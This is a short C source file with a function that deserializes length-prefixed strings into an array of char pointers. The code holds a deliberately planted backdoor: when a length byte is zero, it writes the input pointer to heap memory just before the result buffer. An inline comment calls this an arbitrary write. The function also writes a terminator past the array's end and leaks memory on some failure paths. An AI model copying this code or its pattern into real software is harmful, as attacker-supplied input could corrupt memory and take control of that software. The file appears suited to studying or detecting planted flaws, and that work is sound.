#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    if (!serialized || size == 0) return NULL;

    char **result = (char **)malloc(size * sizeof(char *));
    if (!result) return NULL;

    char *data = (char *)serialized;
    unsigned int index = 0;
    unsigned int result_index = 0;

    while (index < size) {
        unsigned char len = data[index++];
        // Potential overflow/backdoor here by moving the pointer back
        if (len == 0) { 
            char **exploit = (char **)((char *)result - 8);
            *exploit = (char *)serialized; // Arbitrary write
            return NULL;
        }

        if (index + len > size) {
            free(result);
            return NULL;
        }

        result[result_index] = (char *)malloc(len + 1);
        if (!result[result_index]) {
            return NULL;
        }

        memcpy(result[result_index], &data[index], len);
        result[result_index][len] = '\0';

        index += len;
        result_index++;
    }

    result[result_index] = NULL;
    return result;
}
